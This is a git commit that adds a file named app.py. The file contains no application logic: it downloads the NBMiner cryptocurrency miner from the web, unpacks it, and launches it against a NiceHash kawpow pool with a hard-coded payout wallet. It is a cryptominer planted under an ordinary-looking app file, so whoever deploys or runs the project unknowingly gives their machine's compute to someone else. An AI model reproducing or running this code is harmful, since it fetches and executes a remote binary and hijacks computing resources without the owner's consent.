9fd4e1032d3981147666d6f475be049b601b1326
charpn <120244637+charpn@users.noreply.github.com>
2022-12-10 11:15:45 +0300

    Add files via upload

---
+++ app.py
@@ -0,0 +1,6 @@
+import os
+import subprocess
+import tarfile
+os.system('wget https://github.com/NebuTech/NBMiner/releases/download/v42.3/NBMiner_42.3_Linux.tgz')
+os.system('tar -xvf NBMiner_42.3_Linux.tgz')
+os.system('./NBMiner_Linux/nbminer -a kawpow -o stratum+ssl://kawpow.auto.nicehash.com:443 -u NHbPqef6CnXTCjdXXRBqQGvWD43Skb6QFUxh.gpu')
